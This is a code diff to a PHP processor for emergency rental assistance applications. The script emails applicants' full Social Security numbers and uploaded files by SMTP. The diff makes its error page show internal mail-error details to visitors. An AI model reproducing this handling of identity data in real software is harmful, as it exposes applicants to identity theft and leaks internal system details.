@@ -3,9 +3,6 @@
  * ERAP Application Processor
  * Sends full application details, including full SSN and file uploads, via SMTP (PHPMailer-compatible).
  */
-use PHPMailer\PHPMailer\PHPMailer;
-
-require_once __DIR__ . '/mailer-lite.php';
 require_once __DIR__ . '/simple-mailer.php';
 
 $smtp = [
@@ -102,12 +99,14 @@ if ($_SERVER["REQUEST_METHOD"] === "POST") {
         'utility_bills' => 'Utility Bill',
     ];
 
+    $errorMessage = null;
     $sent = send_application_email(
         $smtp,
         "NEW ERAP APPLICATION: {$name}",
         $fields,
         $attachments,
-        $email
+        $email,
+        $errorMessage
     );
 
     if ($sent) {
@@ -117,7 +116,8 @@ if ($_SERVER["REQUEST_METHOD"] === "POST") {
 
     echo "<h1>Application Error</h1>";
     echo "<p>We were unable to process your application at this time. Please contact support.</p>";
-    echo "<pre>" . htmlspecialchars($sent ? '' : 'Unable to send application email.') . "</pre>";
+    $detail = $errorMessage ? "Error: {$errorMessage}" : 'Unable to send application email.';
+    echo "<pre>" . htmlspecialchars($detail) . "</pre>";
     echo "<a href='../erap-apply.html'>Go Back</a>";
 } else {
     header("Location: ../index.html");
